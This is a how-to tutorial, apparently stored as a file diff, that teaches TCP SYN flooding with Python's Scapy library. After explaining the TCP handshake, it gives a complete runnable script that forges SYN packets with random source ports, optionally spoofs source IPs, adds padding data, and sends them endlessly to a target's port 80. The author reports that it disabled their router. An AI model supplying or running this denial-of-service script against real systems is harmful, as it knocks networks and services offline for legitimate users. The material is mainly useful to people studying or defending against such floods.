@@ -1,0 +1,103 @@
+How to Make a SYN Flooding Attack in Python
+Learn how to use Scapy library in Python to perform a TCP SYN Flooding attack, which is a form of denial of service attacks
+
+
+A SYN flood attack is a common form of a denial of service attack in which an attacker sends a sequence of SYN requests to the target system (can be a router, firewall, Intrusion Prevention Systems (IPS), etc.) in order to consume its resources, preventing legitimate clients to establish a normal connection.
+
+TCP SYN flood exploits the first part of the TCP three-way handshake, and since every connection using the TCP protocol requires it, this attack proves to be dangerous and can take down several network components.
+
+In order to understand SYN flood, we first need to talk about TCP three-way handshake:
+
+
+When a client wants to establish a connection to a server via TCP protocol, the client and server exchanges series of messages:
+
+    The client requests a connection by sending SYN message to the server.
+    The server responds with SYN-ACK message (acknowledges the request).
+    The clients responds back with an ACK, and then the connection is started.
+
+SYN flood attack involves a malicious user that sends SYN packets repeatedly without responding with ACK, and often with different source ports, which makes the server unaware of the attack, and responds to each attempt with a SYN-ACK packet from each port (The red and green part of the above image). In this way, the server will quickly be unresponsive to legitimate clients.
+
+
+In this tutorial, we will implement SYN flood attack using Scapy library in Python. To get started, you need to install Scapy:
+
+
+pip3 install scapy
+
+open up a new python file and import scapy
+
+from scapy.all import *
+
+I'm gonna test this on my local router, which has the private IP address of 192.168.1.1:
+
+
+so after importing the library here is the script
+
+# target IP address (should be a testing router/firewall)
+target_ip = "192.168.1.1"
+# the target port u want to flood
+target_port = 80
+
+
+If you want to try this against your router, make sure you have the correct IP address, you can get the default gateway address via ipconfig and ip route commands in Windows and macOS/Linux respectively.
+
+The target port is HTTP, since I want to flood the web interface of my router. Now let's forge our SYN packet, starting with IP layer:
+
+
+# forge IP packet with target ip as the destination IP address
+ip = IP(dst=target_ip)
+# or if you want to perform IP Spoofing (will work as well)
+# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+
+
+We specified the dst as the target IP address, we can also set src address to a spoofed random IP address in the private network range (commented code) and it will work as well.
+
+Let's forge our TCP layer
+
+
+# forge a TCP SYN packet with a random source port
+# and the target port as the destination port
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+
+
+So we're setting the source port (sport) to a random short (which ranges from 1 to 65535, just like ports) and the dport (destination port) as our target port, in this case, it's HTTP service.
+
+
+
+We also set the flags to "S" which indicates the type SYN.
+
+Now let's add some flooding raw data to occupy the network:
+
+
+
+# add some flooding data (1KB in this case)
+raw = Raw(b"X"*1024)
+
+
+Awesome, now let's stack up the layers and send the packet
+
+
+# stack up the layers
+p = ip / tcp / raw
+# send the constructed packet in a loop until CTRL+C is detected 
+send(p, loop=1, verbose=0)
+
+
+So we used send() function that sends packets at layer 3, we set loop to 1 to keep sending until we hit CTRL+C, setting verbose to 0 will not print anything during the process (silent).
+
+
+The script is done! Now after I ran this against my router, it took few seconds and sure enough, the router stopped working and I lost connection:
+
+
+This is the output of the following command on Windows:
+
+
+$ ping -t "192.168.1.1"
+
+
+It was captured from another machine other than the attacker, so the router is no longer responding.
+
+To get everything back to normal, you can either stop the attack (by hitting CTRL+C), if the device is still not responding, go on and reboot it.
+
+
+
+
